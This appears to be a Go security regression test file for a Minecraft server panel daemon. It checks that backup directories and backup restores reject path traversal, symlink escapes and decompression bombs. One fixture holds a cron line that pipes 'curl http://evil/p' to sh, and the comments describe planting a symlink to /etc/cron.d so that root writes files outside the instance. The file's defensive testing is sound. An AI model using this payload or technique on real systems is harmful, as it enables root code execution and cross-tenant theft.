package grpcapi

import (
	"archive/tar"
	"compress/gzip"
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/ATLCNND/ATL-MCPanel/internal/common/config"
	"github.com/ATLCNND/ATL-MCPanel/internal/common/logger"
	"github.com/ATLCNND/ATL-MCPanel/internal/daemon/registry"
	pb "github.com/ATLCNND/ATL-MCPanel/internal/proto/mcpanel"
)

// newSecurityTestServer 建一个只带实例根目录的服务端（备份/回滚相关用例共用）。
// backupRoot 为空表示节点没有配置 backup_root。
func newSecurityTestServer(t *testing.T, backupRoot string) (*Server, *registry.Registry) {
	t.Helper()
	base := t.TempDir()
	stateDir := t.TempDir()
	cfg := &config.DaemonConfig{
		InstanceDir: base,
		StateDir:    stateDir,
		FrpStateDir: t.TempDir(),
		BackupRoot:  backupRoot,
	}
	reg := registry.New(base, stateDir)
	return NewServer(cfg, reg, logger.New("error"), nil, nil), reg
}

// writeRestoreBackup 在实例的备份目录里写一个 tar.gz，返回它的文件名
//（模拟面板上传/生成的备份文件）。
func writeRestoreBackup(t *testing.T, instDir string, entries map[string]string) string {
	t.Helper()
	bdir := filepath.Join(instDir, backupsDirName)
	if err := os.MkdirAll(bdir, 0o755); err != nil {
		t.Fatal(err)
	}
	name := "bk_1_test.tar.gz"
	f, err := os.Create(filepath.Join(bdir, name))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)
	for n, c := range entries {
		if err := tw.WriteHeader(&tar.Header{
			Name: n, Mode: 0o644, Size: int64(len(c)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(c)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return name
}

// 客户端可控的 backup_dir 不得逃出沙箱（2026-10-01 安全审查的 HIGH 发现）。
//
// inst.BackupDir 原样来自建实例请求里的 `backup_dir` 字段，之后被当作
// Backup（以 root 建文件）、ListBackups、DeleteBackup（os.Remove 以 root）、
// Restore 的根目录。于是一个普通租户只要填
// "/opt/atl-node/instances/<别人的实例>/backups"，就能列出、下载、删除别人的
// 备份，再恢复到自己的实例里 —— 别人的 world、ops.json、server.properties
// 全成了可读的。
//
// 现在的口径：只认"实例目录之内"或"节点 backup_root 之下"，其余**明确报错**；
// 同时守住正常配置没被误伤。
func TestBackupDirRejectsOutOfRangeBackupDir(t *testing.T) {
	srv, reg := newSecurityTestServer(t, "")
	victim, err := reg.Create(registry.Meta{ID: "victim"})
	if err != nil {
		t.Fatal(err)
	}
	// registry.Create 会把 Meta.BackupDir 原样挂到实例上（这正是漏洞的入口）
	attacker, err := reg.Create(registry.Meta{ID: "alpha", BackupDir: filepath.Join(victim.Dir, backupsDirName)})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := srv.backupDir(attacker); err == nil {
		t.Error("指向别的实例的 backup_dir 必须被拒绝（否则可以列出/删除/恢复别人的备份）")
	}

	// 实例目录与 backup_root 之外的绝对路径
	attacker.BackupDir = "/etc"
	if _, err := srv.backupDir(attacker); err == nil {
		t.Error("实例目录之外的绝对 backup_dir 必须被拒绝")
	}
	// 用 .. 拼出来的越界路径（Clean 之后就出界了）
	attacker.BackupDir = filepath.Join(attacker.Dir, "..", "victim", backupsDirName)
	if _, err := srv.backupDir(attacker); err == nil {
		t.Error("用 .. 拼出的越界 backup_dir 必须被拒绝")
	}
	// 相对路径无法证明落在实例目录内（Daemon 的工作目录是 /opt/mcpanel）
	attacker.BackupDir = "backups"
	if _, err := srv.backupDir(attacker); err == nil {
		t.Error("相对 backup_dir 必须被拒绝")
	}

	// 实例目录之内：照旧允许
	attacker.BackupDir = filepath.Join(attacker.Dir, backupsDirName)
	got, err := srv.backupDir(attacker)
	if err != nil {
		t.Fatalf("实例目录内的 backup_dir 被误伤：%v", err)
	}
	if want := filepath.Join(attacker.Dir, backupsDirName); got != want {
		t.Errorf("backupDir = %q，期望 %q", got, want)
	}

	// 节点 backup_root 之下：照旧允许（管理员配置的集中冷存储）
	root2 := t.TempDir()
	srv2, reg2 := newSecurityTestServer(t, root2)
	inst2, err := reg2.Create(registry.Meta{ID: "beta", BackupDir: filepath.Join(root2, "beta")})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := srv2.backupDir(inst2); err != nil {
		t.Errorf("backup_root 之下的 backup_dir 被误伤：%v", err)
	}
	// backup_root 之内的软链接逃逸（`beta -> /etc`）同样要挡住
	if runtime.GOOS != "windows" {
		escapeRoot := t.TempDir()
		srv3, reg3 := newSecurityTestServer(t, escapeRoot)
		inst3, err := reg3.Create(registry.Meta{ID: "gamma", BackupDir: filepath.Join(escapeRoot, "gamma")})
		if err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink("/etc", filepath.Join(escapeRoot, "gamma")); err != nil {
			t.Fatal(err)
		}
		if _, err := srv3.backupDir(inst3); err == nil {
			t.Error("backup_root 之下的软链接逃逸必须被拒绝")
		}
	}
}

// 回滚（Restore）也必须做真实路径边界检查：`backups/` 不是受保护路径，
// 租户可以在自己的实例里放 `d/evil -> /etc/cron.d`，再让备份里带条目
// `d/evil/rce` —— 词法路径看着在实例目录内，实际却由 root 写到实例之外。
// 解压那条路（fileops.safeJoin）与这里是同一个口子。
func TestRestoreRejectsSymlinkedDirEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows 上创建软链接需要额外权限，且 Daemon 只发布 Linux 版本")
	}
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}

	base := filepath.Join(root, "instances")
	stateDir := filepath.Join(root, "state")
	cfg := &config.DaemonConfig{InstanceDir: base, StateDir: stateDir, FrpStateDir: filepath.Join(root, "frp")}
	reg := registry.New(base, stateDir)
	srv := NewServer(cfg, reg, logger.New("error"), nil, nil)

	inst, err := reg.Create(registry.Meta{ID: "alpha"})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(inst.Dir, "d"), 0o755); err != nil {
		t.Fatal(err)
	}
	// 租户在这个实例里放好的目录软链接（文件管理就能建）
	if err := os.Symlink(outside, filepath.Join(inst.Dir, "d", "evil")); err != nil {
		t.Fatal(err)
	}
	name := writeRestoreBackup(t, inst.Dir, map[string]string{"d/evil/rce": "pwn"})

	resp, err := srv.Restore(context.Background(), &pb.RestoreRequest{InstanceId: "alpha", BackupId: name})
	if err != nil {
		t.Fatalf("Restore 返回错误: %v", err)
	}
	if resp.Success {
		t.Error("含软链接逃逸条目的备份本应回滚失败")
	}
	if _, serr := os.Stat(filepath.Join(outside, "rce")); serr == nil {
		t.Error("文件被写到了实例目录之外（root 写穿了软链接）")
	}
}

// 最后一段是软链接时回滚同样要拒绝：**悬空**软链接只有 O_NOFOLLOW 挡得住
//（EvalSymlinks 解析不出悬空链接，会把它当成"还不存在的尾段"接回去），
// 而那正是审计里给出的 PoC 形态 —— 悬空软链接 + 让 root 顺手把目标建出来。
func TestRestoreRefusesSymlinkTarget(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Daemon 只发布 Linux 版本（O_NOFOLLOW）")
	}
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(root, "outside")
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}

	base := filepath.Join(root, "instances")
	stateDir := filepath.Join(root, "state")
	cfg := &config.DaemonConfig{InstanceDir: base, StateDir: stateDir, FrpStateDir: filepath.Join(root, "frp")}
	reg := registry.New(base, stateDir)
	srv := NewServer(cfg, reg, logger.New("error"), nil, nil)

	inst, err := reg.Create(registry.Meta{ID: "alpha"})
	if err != nil {
		t.Fatal(err)
	}
	dangling := filepath.Join(outside, "atl-x")
	if err := os.Symlink(dangling, filepath.Join(inst.Dir, "console.log")); err != nil {
		t.Fatal(err)
	}
	name := writeRestoreBackup(t, inst.Dir, map[string]string{
		"console.log": "* * * * * root curl http://evil/p | sh",
	})

	resp, err := srv.Restore(context.Background(), &pb.RestoreRequest{InstanceId: "alpha", BackupId: name})
	if err != nil {
		t.Fatalf("Restore 返回错误: %v", err)
	}
	if resp.Success {
		t.Error("目标是悬空软链接时本应回滚失败（否则 root 会替租户建出任意文件）")
	}
	if _, serr := os.Stat(dangling); !os.IsNotExist(serr) {
		t.Error("实例外的文件被以 root 建出来了")
	}
}

// 回滚与解压必须上同一套资源上限：以前回滚一条都没有，一个约 1 MB 的
// "全零 gzip"能解出几百 GB，把节点磁盘写满，同节点**其它租户**的实例跟着
// 一起存不了档（跨租户的可用性攻击）。这里验证层级上限走的是真实的 Restore 路径。
func TestRestoreRejectsOverDepth(t *testing.T) {
	srv, reg := newSecurityTestServer(t, "")
	inst, err := reg.Create(registry.Meta{ID: "alpha"})
	if err != nil {
		t.Fatal(err)
	}
	deep := strings.Repeat("d/", maxRestoreDepth+5) + "f.txt"
	name := writeRestoreBackup(t, inst.Dir, map[string]string{deep: "x"})

	resp, err := srv.Restore(context.Background(), &pb.RestoreRequest{InstanceId: "alpha", BackupId: name})
	if err != nil {
		t.Fatalf("Restore 返回错误: %v", err)
	}
	if resp.Success {
		t.Error("超深路径的备份本应被拒绝")
	}
	if !strings.Contains(resp.Error, "层级过深") {
		t.Errorf("错误信息应说明层级过深，实际：%q", resp.Error)
	}
}

// restoreQuota 的三道上限必须真的会拒绝。
//
// 200 GB 的上限没法在测试里真写出来，所以把上限换成小值来验证"超额即拒绝"
// 这条路径确实走到了 —— 这也是把计数单独做成一个小类型的原因。
func TestRestoreQuotaCaps(t *testing.T) {
	// 层级上限（与 fileops.safeJoin 的 maxExtractDepth 同口径：路径段数）
	q := restoreQuota{maxBytes: 1 << 20, maxFiles: 10, maxDepth: 3}
	if err := q.entry("a/b/c"); err != nil {
		t.Errorf("三段路径不该超限：%v", err)
	}
	if err := q.entry("a/b/c/d"); err == nil {
		t.Error("超过层级上限应拒绝")
	}
	// 条目数上限
	f := restoreQuota{maxBytes: 1 << 20, maxFiles: 2, maxDepth: 64}
	if err := f.entry("a"); err != nil {
		t.Errorf("第 1 个条目不该超限：%v", err)
	}
	if err := f.entry("b"); err != nil {
		t.Errorf("第 2 个条目不该超限：%v", err)
	}
	if err := f.entry("c"); err == nil {
		t.Error("超过条目数上限应拒绝")
	}
	// 字节上限：正好等于上限要放行，多 1 字节要拒绝
	b := restoreQuota{maxBytes: 10, maxFiles: 10, maxDepth: 64}
	if err := b.add(10); err != nil {
		t.Errorf("正好等于上限应放行：%v", err)
	}
	if err := b.add(1); err == nil {
		t.Error("超过字节上限应拒绝")
	}
	if got := b.limit(); got != 1 {
		t.Errorf("配额用尽后允许读取的字节数应只剩「多读 1 字节」，实际 %d", got)
	}
}

// 正常备份仍要能回滚（加固不能把功能一起挡掉）：内容、层级、文件数都对。
func TestRestoreNormalBackupStillWorks(t *testing.T) {
	srv, reg := newSecurityTestServer(t, "")
	inst, err := reg.Create(registry.Meta{ID: "alpha"})
	if err != nil {
		t.Fatal(err)
	}
	name := writeRestoreBackup(t, inst.Dir, map[string]string{
		"world/level.dat":   "LEVEL",
		"server.properties": "motd=hi\n",
	})

	resp, err := srv.Restore(context.Background(), &pb.RestoreRequest{InstanceId: "alpha", BackupId: name})
	if err != nil {
		t.Fatalf("Restore 返回错误: %v", err)
	}
	if !resp.Success {
		t.Fatalf("普通备份应回滚成功，实际失败：%s", resp.Error)
	}
	if b, rerr := os.ReadFile(filepath.Join(inst.Dir, "world", "level.dat")); rerr != nil || string(b) != "LEVEL" {
		t.Errorf("world/level.dat 未还原：%q err=%v", string(b), rerr)
	}
	if b, rerr := os.ReadFile(filepath.Join(inst.Dir, "server.properties")); rerr != nil || string(b) != "motd=hi\n" {
		t.Errorf("server.properties 未还原：%q err=%v", string(b), rerr)
	}
}
